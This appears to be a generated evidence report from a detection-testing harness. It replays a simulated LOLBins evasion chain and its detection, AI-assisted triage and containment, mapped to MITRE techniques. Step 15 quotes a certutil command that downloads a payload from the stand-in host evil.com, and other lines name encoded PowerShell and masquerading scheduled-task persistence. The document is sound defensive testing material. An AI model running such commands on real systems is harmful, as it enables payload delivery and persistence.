# Evidence Bundle — PKG-010

**Package:** Living off the Land (LOLBins)  
**Scenario:** GhostBin LOLBins Evasion Chain (`pkg-010`)  
**Generated:** 2026-03-16T18:25:00.651Z  
**Harness Level:** 3 (Replay & Evidence)  
**Verdict:** ✅ **PASS** — All 3 declared MITRE techniques (from metadata.yml) validated by replay heuristics. 3 detection triggers, 10 playbook actions observed.

---

## Replay Summary

| Metric | Value |
|---|---|
| Total scenario steps | 63 |
| Body (telemetry) steps | 9 |
| Brain (reasoning) steps | 9 |
| Purpose (playbook) steps | 8 |
| Edge (enforcement) steps | 3 |
| Detection triggers | 3 |
| Playbook actions | 10 |
| MITRE techniques declared | 3 |
| MITRE techniques exercised | 3 |
| Declared-technique coverage | **100%** |

## MITRE ATT&CK Coverage

| Technique | Tactic | Exercised | Steps | Detected By | Responded By |
|---|---|---|---|---|---|
| T1218 | Defense Evasion | ✅ | 8, 12, 14, 16 | lolbins-abuse-detection | lolbins-containment-response |
| T1059.001 | Execution | ✅ | 8, 12, 14, 16 | lolbins-abuse-detection | lolbins-containment-response |
| T1036 | Defense Evasion | ✅ | 8, 12, 14, 16 | lolbins-abuse-detection | lolbins-containment-response |

## Artifacts Used

| Artifact | File | Status |
|---|---|---|
| detection | `detection.yaml` | ✅ Loaded |
| playbook | `playbook.yaml` | ✅ Loaded |
| policy | `policy.yaml` | ✅ Loaded |
| metadata | `metadata.yml` | ✅ Loaded |

## Replay Timeline (Artifact Hits)

| Step | Phase | Pillar | Artifact | MITRE | Text (truncated) |
|---|---|---|---|---|---|
| 12 | 1 | BODY | `detection.yaml` | T1218, T1059.001, T1036 | ━━━ PHASE 1: THE BODY — Endpoint Telemetry ━━━━━━━━━━━━━━━━━ |
| 14 | 1 | BODY | `detection.yaml` | T1218, T1059.001, T1036 | [BODY] Sysmon EventID 1: Process creation — certutil.exe |
| 16 | 1 | BODY | `detection.yaml` | T1218, T1059.001, T1036 | [BODY] ⚡ Detection triggered: BODY-LOLBIN-CHAIN-e5c2f8 |
| 30 | 2 | BRAIN | `playbook.yaml` | T1218.005 | [BRAIN]   ├─ mshta eval: scriptlet execution (T1218.005) |
| 34 | 2 | BRAIN | `playbook.yaml` | — | [BRAIN] Recommended playbook: lolbins-containment-response v... |
| 37 | 3 | PURPOSE | `playbook.yaml` | — | ━━━ PHASE 3: THE PURPOSE — CLAW Playbook Execution ━━━━━━━━━... |
| 39 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW] Loading: lolbins-containment-response v1.0.0 |
| 40 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW] Step 1/3: terminate_lolbin_process |
| 41 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW]   target: BODY | action: terminate process tree |
| 43 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW] Step 2/3: collect_execution_artifacts |
| 44 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW]   target: INTERNAL | action: collect prefetch + shimc... |
| 46 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW] Step 3/3: apply_applocker_policy |
| 47 | 3 | PURPOSE | `playbook.yaml` | — | [CLAW]   target: EDGE | action: enforce AppLocker for LOLBin... |
| 50 | 4 | EDGE | `policy.yaml` | — | ━━━ PHASE 4: THE EDGE — Enforcement ━━━━━━━━━━━━━━━━━━━━━━━━ |
| 52 | 4 | EDGE | `policy.yaml` | — | [EDGE] Enforcing application control... |
| 53 | 4 | EDGE | `policy.yaml` | — | [EDGE] HMAC-SHA256 signature: VERIFIED ✓ |

<details>
<summary>Full Replay Timeline (all pillar steps)</summary>

| Step | Pillar | Text |
|---|---|---|
| 12 | BODY | ━━━ PHASE 1: THE BODY — Endpoint Telemetry ━━━━━━━━━━━━━━━━━ |
| 14 | BODY | [BODY] Sysmon EventID 1: Process creation — certutil.exe |
| 15 | BODY | [BODY] CommandLine: certutil -urlcache -split -f http://evil.com/payload.b64 C:\... |
| 16 | BODY | [BODY] ⚡ Detection triggered: BODY-LOLBIN-CHAIN-e5c2f8 |
| 17 | BODY | [BODY]   ├─ certutil.exe: -urlcache download from external URL |
| 18 | BODY | [BODY]   ├─ mshta.exe: javascript:eval() execution (child of certutil) |
| 19 | BODY | [BODY]   ├─ powershell.exe: -EncodedCommand with base64 payload |
| 20 | BODY | [BODY]   ├─ schtasks.exe: /create /tn "WindowsUpdate" persistence |
| 21 | BODY | [BODY]   └─ Process tree: certutil → mshta → powershell → schtasks |
| 25 | BRAIN | ━━━ PHASE 2: THE BRAIN — AI Threat Analysis ━━━━━━━━━━━━━━━━━ |
| 27 | BRAIN | [BRAIN] Receiving detection BODY-LOLBIN-CHAIN-e5c2f8... |
| 28 | BRAIN | [BRAIN] Loading governance: ai_governance_baseline.yaml |
| 29 | BRAIN | [BRAIN]   ├─ certutil download: known LOLBin abuse pattern |
| 30 | BRAIN | [BRAIN]   ├─ mshta eval: scriptlet execution (T1218.005) |
| 31 | BRAIN | [BRAIN]   ├─ PowerShell: encoded command (obfuscation indicator) |
| 32 | BRAIN | [BRAIN]   └─ Scheduled task: masquerading as WindowsUpdate |
| 33 | BRAIN | [BRAIN] Confidence: 85% → 93% (4-binary chain + masquerading) |
| 34 | BRAIN | [BRAIN] Recommended playbook: lolbins-containment-response v1.0.0 |
| 37 | PURPOSE | ━━━ PHASE 3: THE PURPOSE — CLAW Playbook Execution ━━━━━━━━━━ |
| 39 | PURPOSE | [CLAW] Loading: lolbins-containment-response v1.0.0 |
| 40 | PURPOSE | [CLAW] Step 1/3: terminate_lolbin_process |
| 41 | PURPOSE | [CLAW]   target: BODY | action: terminate process tree |
| 43 | PURPOSE | [CLAW] Step 2/3: collect_execution_artifacts |
| 44 | PURPOSE | [CLAW]   target: INTERNAL | action: collect prefetch + shimcache |
| 46 | PURPOSE | [CLAW] Step 3/3: apply_applocker_policy |
| 47 | PURPOSE | [CLAW]   target: EDGE | action: enforce AppLocker for LOLBins |
| 50 | EDGE | ━━━ PHASE 4: THE EDGE — Enforcement ━━━━━━━━━━━━━━━━━━━━━━━━ |
| 52 | EDGE | [EDGE] Enforcing application control... |
| 53 | EDGE | [EDGE] HMAC-SHA256 signature: VERIFIED ✓ |

</details>
